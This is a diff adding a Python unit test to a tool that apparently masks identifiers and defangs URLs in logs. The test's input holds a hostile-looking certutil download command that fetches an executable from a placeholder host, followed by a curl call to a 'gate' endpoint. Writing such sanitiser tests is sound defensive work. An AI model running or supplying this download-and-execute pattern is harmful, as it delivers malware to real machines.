@@ -277,3 +277,11 @@ def test_well_known_principals_kept(tmp_path):
     m.refresh_sweep()
     assert m.text("Microsoft® Windows® Operating System") == "Microsoft® Windows® Operating System"
     assert "S-1-5-21" not in m.value("AccountSid", "S-1-5-21-1111111111-2222222222-3333333333-1001")
+
+
+def test_scheme_defanged_when_host_is_known(tmp_path):
+    m = masker(tmp_path)
+    m.value("RemoteUrl", "cdn-1a2b.test")
+    m.refresh_sweep()
+    out = m.text("certutil -urlcache -f http://cdn-1a2b.test/dl/x.php a.exe && curl https://cdn-1a2b.test/gate")
+    assert "http://" not in out and "https://" not in out and out.count("hxxp") == 2, out
